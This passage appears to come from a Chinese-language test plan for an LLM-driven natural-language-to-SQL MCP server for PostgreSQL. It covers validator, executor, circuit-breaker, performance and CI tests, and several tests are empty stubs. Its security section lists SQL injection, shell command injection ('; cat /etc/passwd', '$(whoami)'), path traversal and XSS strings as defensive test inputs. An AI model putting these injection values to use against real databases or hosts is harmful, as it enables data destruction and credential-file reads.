                sql="SELECT * FROM users",
                executed=True,
                result=[{"id": 1, "username": "alice"}],
                row_count=1,
            ),
            request_id="req_123",
        )
        assert response.success is True
        assert response.data.row_count == 1

    def test_query_response_error(self):
        """错误响应"""
        response = QueryResponse(
            success=False,
            error=ErrorDetail(
                code=ErrorCode.SECURITY_VIOLATION,
                message="SQL 验证失败",
            ),
            request_id="req_123",
        )
        assert response.success is False
        assert response.error.code == ErrorCode.SECURITY_VIOLATION


class TestErrorModels:
    """测试错误模型"""

    def test_pg_mcp_error_to_error_detail(self):
        """异常转换为错误详情"""
        error = PgMcpError(
            code=ErrorCode.SECURITY_VIOLATION,
            message="不允许的操作",
            details="尝试执行 DELETE 语句",
            suggestion="请使用 SELECT 语句",
        )
        detail = error.to_error_detail()

        assert detail.code == ErrorCode.SECURITY_VIOLATION
        assert detail.message == "不允许的操作"
        assert detail.details == "尝试执行 DELETE 语句"
        assert detail.suggestion == "请使用 SELECT 语句"

    def test_security_violation_error(self):
        """安全违规错误"""
        error = SecurityViolationError(
            message="SQL 安全验证失败",
            details="检测到 INSERT 语句",
        )
        assert error.code == ErrorCode.SECURITY_VIOLATION
        assert "SELECT" in error.suggestion

    def test_llm_error(self):
        """LLM 错误"""
        error = LLMError(
            message="SQL 生成失败",
            details="API 超时",
        )
        assert error.code == ErrorCode.LLM_ERROR
```

### 3.4 SQL 生成器测试

```python
# tests/unit/test_sql_generator.py

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from pg_mcp.services.sql_generator import SQLGenerator
from pg_mcp.models.errors import LLMError


class TestSQLExtraction:
    """测试 SQL 提取逻辑"""

    @pytest.fixture
    def generator(self, openai_config):
        return SQLGenerator(openai_config)

    @pytest.mark.parametrize("content,expected", [
        # 标准 markdown 代码块
        ("```sql\nSELECT * FROM users;\n```", "SELECT * FROM users;"),
        # 无语言标识的代码块
        ("```\nSELECT * FROM users;\n```", "SELECT * FROM users;"),
        # 代码块前后有文字
        ("Here is the query:\n```sql\nSELECT * FROM users;\n```\nThis will work.", "SELECT * FROM users;"),
        # 多个代码块（取第一个）
        ("```sql\nSELECT 1;\n```\n```sql\nSELECT 2;\n```", "SELECT 1;"),
    ])
    def test_extract_from_code_block(self, generator, content, expected):
        """从代码块提取 SQL"""
        result = generator._extract_sql(content)
        assert result == expected

    @pytest.mark.parametrize("content,expected_start", [
        # 直接 SELECT
        ("SELECT * FROM users", "SELECT"),
        # 带前缀
        ("The query is: SELECT * FROM users", "SELECT"),
        # WITH 语句
        ("WITH cte AS (SELECT 1) SELECT * FROM cte", "WITH"),
    ])
    def test_extract_bare_sql(self, generator, content, expected_start):
        """提取没有代码块的 SQL"""
        result = generator._extract_sql(content)
        assert result is not None
        assert result.strip().upper().startswith(expected_start)

    @pytest.mark.parametrize("content", [
        "I cannot generate that query.",
        "The table does not exist.",
        "",
        None,
    ])
    def test_extract_returns_none_for_invalid(self, generator, content):
        """无效内容返回 None"""
        result = generator._extract_sql(content)
        assert result is None


class TestSQLGeneration:
    """测试 SQL 生成"""

    @pytest.fixture
    def generator(self, openai_config, mock_openai_client):
        gen = SQLGenerator(openai_config)
        gen.client = mock_openai_client
        return gen

    @pytest.mark.asyncio
    async def test_generate_success(self, generator, sample_schema):
        """成功生成 SQL"""
        sql = await generator.generate(
            question="查询所有用户",
            schema=sample_schema,
        )
        assert sql is not None
        assert "SELECT" in sql.upper()

    @pytest.mark.asyncio
    async def test_generate_with_retry_context(self, generator, sample_schema):
        """带重试上下文的生成"""
        sql = await generator.generate(
            question="查询所有用户",
            schema=sample_schema,
            previous_attempt="SELECT * FROM user",  # 错误的表名
            error_feedback="表 'user' 不存在，应该是 'users'",
        )
        assert sql is not None

    @pytest.mark.asyncio
    async def test_generate_llm_error(self, openai_config, sample_schema):
        """LLM 调用失败"""
        mock_client = AsyncMock()
        mock_client.chat.completions.create = AsyncMock(side_effect=Exception("API Error"))

        generator = SQLGenerator(openai_config)
        generator.client = mock_client

        with pytest.raises(LLMError) as exc_info:
            await generator.generate(question="query", schema=sample_schema)

        assert "生成失败" in exc_info.value.message

    @pytest.mark.asyncio
    async def test_generate_no_sql_in_response(self, openai_config, sample_schema):
        """LLM 响应中没有 SQL"""
        mock_client = AsyncMock()
        mock_client.chat.completions.create = AsyncMock(return_value=MagicMock(
            choices=[MagicMock(message=MagicMock(content="I cannot help with that."))],
            usage=MagicMock(total_tokens=50),
        ))

        generator = SQLGenerator(openai_config)
        generator.client = mock_client

        with pytest.raises(LLMError) as exc_info:
            await generator.generate(question="query", schema=sample_schema)

        assert "未生成有效的 SQL" in exc_info.value.message
```

### 3.5 弹性组件测试

```python
# tests/unit/test_resilience.py

import pytest
import asyncio
import time
from unittest.mock import patch

from pg_mcp.resilience.circuit_breaker import CircuitBreaker, CircuitState
from pg_mcp.resilience.rate_limiter import SemaphoreRateLimiter


class TestCircuitBreaker:
    """测试熔断器"""

    @pytest.fixture
    def breaker(self):
        return CircuitBreaker(failure_threshold=3, recovery_timeout=1)

    def test_initial_state_closed(self, breaker):
        """初始状态为 CLOSED"""
        assert breaker.state == CircuitState.CLOSED

    def test_allows_request_when_closed(self, breaker):
        """CLOSED 状态允许请求"""
        assert breaker.allow_request() is True

    def test_opens_after_threshold_failures(self, breaker):
        """达到阈值后打开熔断器"""
        for _ in range(3):
            breaker.record_failure()

        assert breaker.state == CircuitState.OPEN
        assert breaker.allow_request() is False

    def test_success_resets_failure_count(self, breaker):
        """成功重置失败计数"""
        breaker.record_failure()
        breaker.record_failure()
        breaker.record_success()

        # 再记录一次失败不应该触发熔断
        breaker.record_failure()
        assert breaker.state == CircuitState.CLOSED

    def test_transitions_to_half_open_after_timeout(self, breaker):
        """超时后转换为 HALF_OPEN"""
        for _ in range(3):
            breaker.record_failure()

        assert breaker.state == CircuitState.OPEN

        # 模拟时间流逝
        with patch('time.time', return_value=time.time() + 2):
            assert breaker.allow_request() is True
            assert breaker.state == CircuitState.HALF_OPEN

    def test_success_in_half_open_closes_circuit(self, breaker):
        """HALF_OPEN 状态成功关闭熔断器"""
        for _ in range(3):
            breaker.record_failure()

        with patch('time.time', return_value=time.time() + 2):
            breaker.allow_request()  # 触发 HALF_OPEN
            breaker.record_success()

            assert breaker.state == CircuitState.CLOSED

    def test_failure_in_half_open_opens_circuit(self, breaker):
        """HALF_OPEN 状态失败重新打开熔断器"""
        for _ in range(3):
            breaker.record_failure()

        with patch('time.time', return_value=time.time() + 2):
            breaker.allow_request()  # 触发 HALF_OPEN
            breaker.record_failure()

            assert breaker.state == CircuitState.OPEN


class TestSemaphoreRateLimiter:
    """测试限流器"""

    @pytest.fixture
    def limiter(self):
        return SemaphoreRateLimiter(max_concurrent=3)

    def test_initial_available(self, limiter):
        """初始可用许可数"""
        assert limiter.available == 3

    @pytest.mark.asyncio
    async def test_acquire_and_release(self, limiter):
        """获取和释放许可"""
        async with limiter:
            assert limiter.available == 2

        assert limiter.available == 3

    @pytest.mark.asyncio
    async def test_blocks_when_exhausted(self, limiter):
        """许可耗尽时阻塞"""
        # 获取所有许可
        await limiter._semaphore.acquire()
        await limiter._semaphore.acquire()
        await limiter._semaphore.acquire()

        assert limiter.available == 0

        # 尝试快速获取应该失败
        result = await limiter.acquire()
        assert result is False

    @pytest.mark.asyncio
    async def test_concurrent_usage(self, limiter):
        """并发使用测试"""
        results = []

        async def task(task_id):
            async with limiter:
                results.append(f"start_{task_id}")
                await asyncio.sleep(0.1)
                results.append(f"end_{task_id}")

        # 启动 5 个任务，但限流器只允许 3 个并发
        await asyncio.gather(*[task(i) for i in range(5)])

        assert len(results) == 10  # 5 个开始 + 5 个结束
```

### 3.6 SQL 执行器测试

```python
# tests/unit/test_sql_executor.py

import pytest
from datetime import datetime, date, timedelta
from decimal import Decimal
import uuid
from unittest.mock import AsyncMock, MagicMock

from pg_mcp.services.sql_executor import SQLExecutor
from pg_mcp.models.errors import PgMcpError, ErrorCode


class TestResultSerialization:
    """测试结果序列化"""

    @pytest.fixture
    def executor(self, mock_asyncpg_pool, security_config, database_config):
        return SQLExecutor(mock_asyncpg_pool, security_config, database_config)

    def test_serialize_datetime(self, executor):
        """datetime 序列化"""
        dt = datetime(2025, 1, 15, 10, 30, 0)
        results = [{"created_at": dt}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["created_at"] == "2025-01-15T10:30:00"

    def test_serialize_date(self, executor):
        """date 序列化"""
        d = date(2025, 1, 15)
        results = [{"birth_date": d}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["birth_date"] == "2025-01-15"

    def test_serialize_timedelta(self, executor):
        """timedelta 序列化"""
        td = timedelta(days=7, hours=3)
        results = [{"duration": td}]
        serialized = executor._serialize_results(results)

        assert "7 days" in serialized[0]["duration"]

    def test_serialize_decimal(self, executor):
        """Decimal 序列化"""
        results = [{"amount": Decimal("123.45")}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["amount"] == 123.45
        assert isinstance(serialized[0]["amount"], float)

    def test_serialize_uuid(self, executor):
        """UUID 序列化"""
        u = uuid.uuid4()
        results = [{"id": u}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["id"] == str(u)

    def test_serialize_bytes(self, executor):
        """bytes 序列化"""
        b = b"\x00\xff\x10"
        results = [{"data": b}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["data"] == "00ff10"

    def test_serialize_nested_structures(self, executor):
        """嵌套结构序列化"""
        results = [{
            "data": {
                "created_at": datetime(2025, 1, 15),
                "amounts": [Decimal("10.00"), Decimal("20.00")],
            }
        }]
        serialized = executor._serialize_results(results)

        assert serialized[0]["data"]["created_at"] == "2025-01-15T00:00:00"
        assert serialized[0]["data"]["amounts"] == [10.0, 20.0]

    def test_serialize_none_preserved(self, executor):
        """None 值保持不变"""
        results = [{"value": None}]
        serialized = executor._serialize_results(results)

        assert serialized[0]["value"] is None
```

---

## 4. 集成测试计划

### 4.1 数据库连接测试

```python
# tests/integration/test_db_connection.py

import pytest
import pytest_asyncio
import asyncpg

from pg_mcp.db.pool import create_pools, close_pools


@pytest.mark.integration
class TestDatabaseConnection:
    """数据库连接集成测试"""

    @pytest.mark.asyncio
    async def test_create_connection_pool(self, database_config):
        """创建连接池"""
        pools = await create_pools([database_config])

        assert len(pools) == 1
        assert database_config.name in pools

        pool = pools[database_config.name]
        assert pool.get_size() >= database_config.min_connections

        await close_pools(pools)

    @pytest.mark.asyncio
    async def test_pool_executes_query(self, real_pg_pool):
        """连接池执行查询"""
        async with real_pg_pool.acquire() as conn:
            result = await conn.fetchval("SELECT 1")
            assert result == 1

    @pytest.mark.asyncio
    async def test_pool_handles_concurrent_queries(self, real_pg_pool):
        """并发查询处理"""
        import asyncio

        async def query(i):
            async with real_pg_pool.acquire() as conn:
                return await conn.fetchval(f"SELECT {i}")

        results = await asyncio.gather(*[query(i) for i in range(10)])
        assert results == list(range(10))

    @pytest.mark.asyncio
    async def test_connection_error_handling(self):
        """连接错误处理"""
        from pg_mcp.config.settings import DatabaseConfig

        bad_config = DatabaseConfig(
            name="bad",
            host="nonexistent.host",
            port=5432,
            user="user",
            password="pass",
            database="db",
        )

        with pytest.raises(Exception):  # 应该抛出连接错误
            await create_pools([bad_config])
```

### 4.2 Schema 缓存测试

```python
# tests/integration/test_schema_cache.py

import pytest
import pytest_asyncio

from pg_mcp.cache.schema_cache import SchemaCache


@pytest.mark.integration
class TestSchemaCache:
    """Schema 缓存集成测试"""

    @pytest.mark.asyncio
    async def test_load_schema(self, real_pg_pool, database_config, setup_test_db):
        """加载 Schema"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        assert schema is not None
        assert schema.database_name == database_config.name
        assert len(schema.tables) > 0

    @pytest.mark.asyncio
    async def test_tables_loaded_correctly(self, real_pg_pool, database_config, setup_test_db):
        """表信息正确加载"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        users_table = schema.get_table("users")
        assert users_table is not None
        assert any(col.name == "username" for col in users_table.columns)
        assert any(col.name == "id" for col in users_table.columns)

    @pytest.mark.asyncio
    async def test_columns_have_correct_types(self, real_pg_pool, database_config, setup_test_db):
        """列类型正确"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        orders_table = schema.get_table("orders")
        amount_col = next((c for c in orders_table.columns if c.name == "total_amount"), None)

        assert amount_col is not None
        assert "decimal" in amount_col.data_type.lower() or "numeric" in amount_col.data_type.lower()

    @pytest.mark.asyncio
    async def test_foreign_keys_loaded(self, real_pg_pool, database_config, setup_test_db):
        """外键关系加载"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        orders_table = schema.get_table("orders")
        user_fk = next(
            (fk for fk in orders_table.foreign_keys if fk.column == "user_id"),
            None
        )

        assert user_fk is not None
        assert user_fk.references_table == "users"
        assert user_fk.references_column == "id"

    @pytest.mark.asyncio
    async def test_views_loaded(self, real_pg_pool, database_config, setup_test_db):
        """视图加载"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        # 检查 order_summary 视图
        assert any(v.table_name == "order_summary" for v in schema.views)

    @pytest.mark.asyncio
    async def test_cache_get_returns_loaded_schema(self, real_pg_pool, database_config, setup_test_db):
        """获取缓存的 Schema"""
        cache = SchemaCache()
        await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        cached = cache.get(database_config.name)
        assert cached is not None
        assert cached.database_name == database_config.name

    @pytest.mark.asyncio
    async def test_cache_refresh(self, real_pg_pool, database_config, setup_test_db):
        """刷新缓存"""
        cache = SchemaCache()

        # 首次加载
        schema1 = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )
        cached_at1 = schema1.cached_at

        import asyncio
        await asyncio.sleep(0.1)

        # 刷新
        await cache.refresh(database_config.name, real_pg_pool, database_config)
        schema2 = cache.get(database_config.name)

        assert schema2.cached_at > cached_at1

    @pytest.mark.asyncio
    async def test_prompt_context_generation(self, real_pg_pool, database_config, setup_test_db):
        """Prompt 上下文生成"""
        cache = SchemaCache()
        schema = await cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        context = schema.to_prompt_context()

        assert "users" in context
        assert "orders" in context
        assert "id" in context
        assert "Column" in context or "column" in context
```

### 4.3 SQL 执行集成测试

```python
# tests/integration/test_sql_executor.py

import pytest
import pytest_asyncio

from pg_mcp.services.sql_executor import SQLExecutor
from pg_mcp.models.errors import PgMcpError, ErrorCode


@pytest.mark.integration
class TestSQLExecutor:
    """SQL 执行器集成测试"""

    @pytest_asyncio.fixture
    async def executor(self, real_pg_pool, security_config, database_config):
        return SQLExecutor(real_pg_pool, security_config, database_config)

    @pytest.mark.asyncio
    async def test_execute_simple_select(self, executor, setup_test_db):
        """执行简单 SELECT"""
        results, count = await executor.execute("SELECT * FROM users")

        assert count >= 3  # 测试数据有 3 个用户
        assert len(results) == count

    @pytest.mark.asyncio
    async def test_execute_with_where(self, executor, setup_test_db):
        """带 WHERE 条件的查询"""
        results, count = await executor.execute(
            "SELECT * FROM users WHERE username = 'alice'"
        )

        assert count == 1
        assert results[0]["username"] == "alice"

    @pytest.mark.asyncio
    async def test_execute_join_query(self, executor, setup_test_db):
        """JOIN 查询"""
        sql = """
            SELECT u.username, o.total_amount
            FROM users u
            JOIN orders o ON u.id = o.user_id
        """
        results, count = await executor.execute(sql)

        assert count > 0
        assert "username" in results[0]
        assert "total_amount" in results[0]

    @pytest.mark.asyncio
    async def test_execute_aggregation(self, executor, setup_test_db):
        """聚合查询"""
        sql = "SELECT COUNT(*) as cnt, SUM(total_amount) as total FROM orders"
        results, count = await executor.execute(sql)

        assert count == 1
        assert results[0]["cnt"] >= 3
        assert results[0]["total"] > 0

    @pytest.mark.asyncio
    async def test_execute_respects_row_limit(self, executor, setup_test_db):
        """行数限制"""
        results, total_count = await executor.execute(
            "SELECT * FROM users",
            max_rows=2,
        )

        assert len(results) == 2
        assert total_count >= 3  # 实际行数

    @pytest.mark.asyncio
    async def test_execute_timeout(self, executor, setup_test_db):
        """查询超时"""
        # 使用一个会超时的查询（如果 pg_sleep 可用且未被阻止）
        # 注意：这个测试可能需要根据实际环境调整
        with pytest.raises(PgMcpError) as exc_info:
            await executor.execute(
                "SELECT pg_sleep(10)",  # 10 秒
                timeout=0.1,  # 0.1 秒超时
            )

        # 可能因为 pg_sleep 被阻止或超时
        assert exc_info.value.code in [ErrorCode.QUERY_TIMEOUT, ErrorCode.INTERNAL_ERROR]

    @pytest.mark.asyncio
    async def test_readonly_transaction(self, executor, setup_test_db):
        """只读事务（无法执行写操作）"""
        # 尝试执行 INSERT（应该失败，因为使用只读事务）
        with pytest.raises(Exception):
            await executor.execute(
                "INSERT INTO users (username, email, password_hash) VALUES ('hacker', 'h@h.com', 'x')"
            )

    @pytest.mark.asyncio
    async def test_result_type_serialization(self, executor, setup_test_db):
        """结果类型序列化"""
        sql = "SELECT id, username, created_at FROM users LIMIT 1"
        results, _ = await executor.execute(sql)

        result = results[0]
        # ID 应该是整数
        assert isinstance(result["id"], int)
        # username 应该是字符串
        assert isinstance(result["username"], str)
        # created_at 应该被序列化为 ISO 格式字符串
        assert isinstance(result["created_at"], str)
```

### 4.4 完整流程集成测试

```python
# tests/integration/test_full_flow.py

import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, MagicMock

from pg_mcp.services.orchestrator import QueryOrchestrator
from pg_mcp.services.sql_generator import SQLGenerator
from pg_mcp.services.sql_validator import SQLValidator
from pg_mcp.services.sql_executor import SQLExecutor
from pg_mcp.services.result_validator import ResultValidator
from pg_mcp.cache.schema_cache import SchemaCache
from pg_mcp.resilience.circuit_breaker import CircuitBreaker
from pg_mcp.models.query import QueryRequest, ReturnType


@pytest.mark.integration
class TestFullQueryFlow:
    """完整查询流程集成测试"""

    @pytest_asyncio.fixture
    async def orchestrator(
        self,
        settings,
        real_pg_pool,
        database_config,
        security_config,
        openai_config,
        setup_test_db,
    ):
        """创建完整的协调器"""
        # Schema 缓存
        schema_cache = SchemaCache()
        await schema_cache.load(
            database_name=database_config.name,
            pool=real_pg_pool,
            config=database_config,
        )

        # Mock LLM 客户端
        mock_openai = AsyncMock()
        mock_openai.chat.completions.create = AsyncMock(return_value=MagicMock(
            choices=[MagicMock(message=MagicMock(
                content="```sql\nSELECT * FROM users WHERE username = 'alice';\n```"
            ))],
            usage=MagicMock(total_tokens=100),
        ))

        sql_generator = SQLGenerator(openai_config)
        sql_generator.client = mock_openai

        sql_validator = SQLValidator(security_config)

        executor = SQLExecutor(real_pg_pool, security_config, database_config)

        # Mock 结果验证器
        result_validator = AsyncMock()
        result_validator.validate = AsyncMock(return_value=MagicMock(
            confidence=90,
            explanation="Results match the query",
            is_acceptable=True,
        ))

        circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=30)

        return QueryOrchestrator(
            settings=settings,
            schema_cache=schema_cache,
            sql_generator=sql_generator,
            sql_validator=sql_validator,
            executors={database_config.name: executor},
            result_validator=result_validator,
            llm_circuit_breaker=circuit_breaker,
        )

    @pytest.mark.asyncio
    async def test_simple_query_execution(self, orchestrator, database_config):
        """简单查询执行"""
        request = QueryRequest(
            question="查询用户 alice 的信息",
            database=database_config.name,
            return_type=ReturnType.RESULT,
        )

        response = await orchestrator.execute_query(request)

        assert response.success is True
        assert response.data is not None
        assert response.data.executed is True
        assert response.data.result is not None
        assert len(response.data.result) > 0

    @pytest.mark.asyncio
    async def test_sql_only_mode(self, orchestrator, database_config):
        """仅返回 SQL 模式"""
        request = QueryRequest(
            question="查询所有订单",
            database=database_config.name,
            return_type=ReturnType.SQL,
        )

        response = await orchestrator.execute_query(request)

        assert response.success is True
        assert response.data.executed is False
        assert response.data.sql is not None
        assert response.data.result is None

    @pytest.mark.asyncio
    async def test_auto_database_selection(self, orchestrator):
        """单数据库时自动选择"""
        request = QueryRequest(
            question="查询用户数量",
            # 不指定 database
        )

        response = await orchestrator.execute_query(request)

        assert response.success is True

    @pytest.mark.asyncio
    async def test_invalid_database_error(self, orchestrator):
        """无效数据库错误"""
        request = QueryRequest(
            question="查询用户",
            database="nonexistent_db",
        )

        response = await orchestrator.execute_query(request)

        assert response.success is False
        assert response.error is not None
```

---

## 5. 端到端测试计划

### 5.1 MCP 协议测试

```python
# tests/e2e/test_mcp_protocol.py

import pytest
import pytest_asyncio
import json
from unittest.mock import patch

from mcp.client import ClientSession
from mcp.client.stdio import stdio_client


@pytest.mark.e2e
class TestMCPProtocol:
    """MCP 协议端到端测试"""

    @pytest.mark.asyncio
    async def test_server_initialization(self):
        """服务器初始化"""
        # 启动 MCP 服务器并验证初始化
        pass  # 需要实现具体的测试逻辑

    @pytest.mark.asyncio
    async def test_list_tools(self):
        """列出可用工具"""
        # 验证 query tool 在列表中
        pass

    @pytest.mark.asyncio
    async def test_tool_schema(self):
        """工具 Schema 验证"""
        # 验证 query tool 的参数定义正确
        pass

    @pytest.mark.asyncio
    async def test_query_tool_execution(self):
        """执行 query 工具"""
        pass

    @pytest.mark.asyncio
    async def test_error_response_format(self):
        """错误响应格式"""
        pass
```

### 5.2 完整场景测试

```python
# tests/e2e/test_scenarios.py

import pytest


@pytest.mark.e2e
class TestRealWorldScenarios:
    """真实场景端到端测试"""

    @pytest.mark.asyncio
    async def test_natural_language_to_results(self):
        """自然语言到结果的完整流程"""
        # 输入: "查询过去7天的订单总金额"
        # 验证: 生成正确的 SQL，执行成功，返回正确格式的结果
        pass

    @pytest.mark.asyncio
    async def test_complex_join_query(self):
        """复杂 JOIN 查询场景"""
        # 输入: "查询每个用户的订单数量和总消费金额"
        pass

    @pytest.mark.asyncio
    async def test_aggregation_with_grouping(self):
        """带分组的聚合查询"""
        # 输入: "按产品类别统计销售额"
        pass

    @pytest.mark.asyncio
    async def test_time_based_query(self):
        """时间相关查询"""
        # 输入: "查询本月新注册的用户"
        pass

    @pytest.mark.asyncio
    async def test_security_block_scenario(self):
        """安全阻止场景"""
        # 输入: "删除所有用户数据"
        # 验证: 返回安全错误，不执行任何操作
        pass

    @pytest.mark.asyncio
    async def test_sensitive_data_protection(self):
        """敏感数据保护场景"""
        # 输入: "查询用户密码"
        # 验证: 返回安全错误或不返回密码字段
        pass

    @pytest.mark.asyncio
    async def test_llm_retry_on_validation_failure(self):
        """LLM 重试场景"""
        # Mock LLM 第一次返回无效 SQL，验证重试机制
        pass

    @pytest.mark.asyncio
    async def test_circuit_breaker_activation(self):
        """熔断器激活场景"""
        # 模拟 LLM 连续失败，验证熔断器激活
        pass
```

---

## 6. 性能测试计划

### 6.1 性能基准测试

```python
# tests/performance/test_benchmarks.py

import pytest
import asyncio
import time


@pytest.mark.performance
class TestPerformanceBenchmarks:
    """性能基准测试"""

    @pytest.mark.asyncio
    async def test_simple_query_latency(self, orchestrator, database_config):
        """简单查询延迟"""
        request = QueryRequest(
            question="查询用户数量",
            database=database_config.name,
        )

        start = time.time()
        response = await orchestrator.execute_query(request)
        duration = time.time() - start

        assert response.success is True
        assert duration < 5.0  # 应该在 5 秒内完成

    @pytest.mark.asyncio
    async def test_sql_validation_performance(self, sql_validator):
        """SQL 验证性能"""
        # 生成 100 个复杂 SQL
        sqls = [
            f"SELECT * FROM users u JOIN orders o ON u.id = o.user_id WHERE u.id = {i}"
            for i in range(100)
        ]

        start = time.time()
        for sql in sqls:
            sql_validator.validate(sql)
        duration = time.time() - start

        # 100 个验证应该在 1 秒内完成
        assert duration < 1.0
        # 平均每个验证 < 10ms
        assert duration / 100 < 0.01

    @pytest.mark.asyncio
    async def test_concurrent_query_throughput(self, orchestrator, database_config):
        """并发查询吞吐量"""
        async def single_query():
            request = QueryRequest(
                question="查询用户列表",
                database=database_config.name,
            )
            return await orchestrator.execute_query(request)

        # 并发执行 10 个查询
        start = time.time()
        responses = await asyncio.gather(*[single_query() for _ in range(10)])
        duration = time.time() - start

        # 所有查询应该成功
        assert all(r.success for r in responses)
        # 总时间应该远小于串行执行时间
        assert duration < 15.0  # 假设单个查询最多 3 秒，10 个并发应该 < 15 秒

    @pytest.mark.asyncio
    async def test_schema_cache_performance(self, real_pg_pool, database_config):
        """Schema 缓存性能"""
        cache = SchemaCache()

        # 首次加载
        start = time.time()
        await cache.load(database_config.name, real_pg_pool, database_config)
        first_load = time.time() - start

        # 缓存读取
        start = time.time()
        for _ in range(1000):
            cache.get(database_config.name)
        cache_reads = time.time() - start

        # 首次加载可能需要几百毫秒
        assert first_load < 5.0
        # 1000 次缓存读取应该几乎是即时的
        assert cache_reads < 0.1
```

### 6.2 负载测试

```python
# tests/performance/test_load.py

import pytest
import asyncio


@pytest.mark.performance
@pytest.mark.slow
class TestLoadTesting:
    """负载测试"""

    @pytest.mark.asyncio
    async def test_sustained_load(self, orchestrator, database_config):
        """持续负载测试"""
        # 模拟 1 分钟内每秒 1 个请求
        results = []

        for _ in range(60):
            request = QueryRequest(
                question="查询用户",
                database=database_config.name,
            )
            response = await orchestrator.execute_query(request)
            results.append(response.success)
            await asyncio.sleep(1)

        # 成功率应该 > 95%
        success_rate = sum(results) / len(results)
        assert success_rate > 0.95

    @pytest.mark.asyncio
    async def test_burst_load(self, orchestrator, database_config):
        """突发负载测试"""
        # 同时发送 50 个请求
        async def query():
            request = QueryRequest(
                question="查询用户",
                database=database_config.name,
            )
            return await orchestrator.execute_query(request)

        responses = await asyncio.gather(
            *[query() for _ in range(50)],
            return_exceptions=True,
        )

        # 检查成功率
        successes = sum(1 for r in responses if hasattr(r, 'success') and r.success)
        # 至少 80% 应该成功
        assert successes >= 40
```

---

## 7. 安全测试计划

### 7.1 渗透测试用例

```python
# tests/security/test_penetration.py

import pytest


@pytest.mark.security
class TestSecurityPenetration:
    """安全渗透测试"""

    @pytest.mark.parametrize("malicious_input", [
        # SQL 注入尝试
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "UNION SELECT * FROM secret_data",
        "'; INSERT INTO users VALUES (999, 'hacker'); --",

        # 命令注入尝试
        "; cat /etc/passwd",
        "| ls -la",
        "$(whoami)",

        # 路径遍历
        "../../../etc/passwd",
        "....//....//etc/passwd",

        # Unicode 混淆
        "SELECT\u200B*\u200BFROM\u200Busers",  # 零宽字符

        # 注释绕过
        "SELECT/*comment*/password/**/FROM/**/users",
    ])
    def test_malicious_input_blocked(self, sql_validator, malicious_input):
        """恶意输入被阻止"""
        is_valid, _ = sql_validator.validate(malicious_input)
        # 恶意输入应该被拒绝或被视为无效 SQL
        # 注意：某些输入可能被解析为有效查询但会被其他规则阻止
        pass

    @pytest.mark.asyncio
    async def test_no_information_leakage_on_error(self, orchestrator, database_config):
        """错误响应不泄露敏感信息"""
        request = QueryRequest(
            question="查询 secret_data 表的所有内容",
            database=database_config.name,
        )

        response = await orchestrator.execute_query(request)

        # 响应应该失败
        assert response.success is False

        # 错误信息不应该包含敏感细节
        error_text = str(response.error)
        assert "password" not in error_text.lower()
        assert "secret" not in error_text.lower() or "secret_data" in error_text.lower()
        assert "api_key" not in error_text.lower()

    @pytest.mark.asyncio
    async def test_rate_limiting_prevents_abuse(self, orchestrator, database_config):
        """限流防止滥用"""
        # 快速发送大量请求
        responses = []
        for _ in range(100):
            request = QueryRequest(
                question="查询用户",
                database=database_config.name,
            )
            response = await orchestrator.execute_query(request)
            responses.append(response)

        # 应该有一些请求被限流
        rate_limited = sum(
            1 for r in responses
            if not r.success and r.error and r.error.code.name == "RATE_LIMITED"
        )
        # 限流应该生效（具体数量取决于配置）


### 7.2 输入验证测试

```python
# tests/security/test_input_validation.py

import pytest


@pytest.mark.security
class TestInputValidation:
    """输入验证安全测试"""

    @pytest.mark.parametrize("question", [
        "",  # 空字符串
        "   ",  # 只有空格
        "a" * 20000,  # 超长输入
        "\x00" * 100,  # NULL 字符
        "<script>alert('xss')</script>",  # XSS 尝试
    ])
    def test_question_input_validation(self, question):
        """问题输入验证"""
        from pg_mcp.models.query import QueryRequest
        from pydantic import ValidationError

        try:
            request = QueryRequest(question=question)
            # 如果请求创建成功，验证它是安全的
        except ValidationError:
            # 预期的行为 - 无效输入被拒绝
            pass

    def test_database_name_injection(self, orchestrator):
        """数据库名称注入"""
        from pg_mcp.models.query import QueryRequest

        request = QueryRequest(
            question="查询用户",
            database="test; DROP DATABASE production;--",
        )

        response = asyncio.run(orchestrator.execute_query(request))

        # 应该返回"数据库未配置"错误，而不是执行注入
        assert response.success is False
```

---

## 8. 测试执行计划

### 8.1 测试命令

```bash
# 运行所有单元测试
pytest tests/unit/ -v

# 运行所有单元测试并生成覆盖率报告
pytest tests/unit/ -v --cov=src/pg_mcp --cov-report=html --cov-report=term-missing

# 仅运行 SQL 验证器测试
pytest tests/unit/test_sql_validator.py -v

# 运行集成测试（需要 PostgreSQL）
pytest tests/integration/ -v -m integration

# 运行 E2E 测试
pytest tests/e2e/ -v -m e2e

# 运行安全测试
pytest tests/security/ -v -m security

# 运行性能测试
pytest tests/performance/ -v -m performance

# 运行所有测试（排除慢速测试）
pytest -v -m "not slow"

# 并行运行测试
pytest -v -n auto

# 生成 JUnit XML 报告（用于 CI/CD）
pytest -v --junitxml=test-results.xml
```

### 8.2 CI/CD 集成

```yaml
# .github/workflows/test.yml

name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -e ".[dev]"

      - name: Run unit tests
        run: |
